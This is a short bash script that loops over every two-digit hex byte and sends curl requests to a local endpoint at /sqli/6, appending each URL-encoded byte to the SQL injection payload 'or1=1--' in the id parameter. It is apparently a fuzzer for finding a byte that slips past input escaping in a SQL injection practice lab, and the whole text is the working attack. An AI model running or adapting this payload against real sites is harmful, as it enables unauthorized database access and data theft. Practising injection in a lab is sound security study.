for f in "0" "1" "2" "3" "4" "5" "6" "7" "8" "9" "A" "B" "C" "D" "E" "F":
do
    for g in "0" "1" "2" "3" "4" "5" "6" "7" "8" "9" "A" "B" "C" "D" "E" "F":
    do
        curl "http://localhost/sqli/6?id=%$f$g'or1=1--"
    done
done
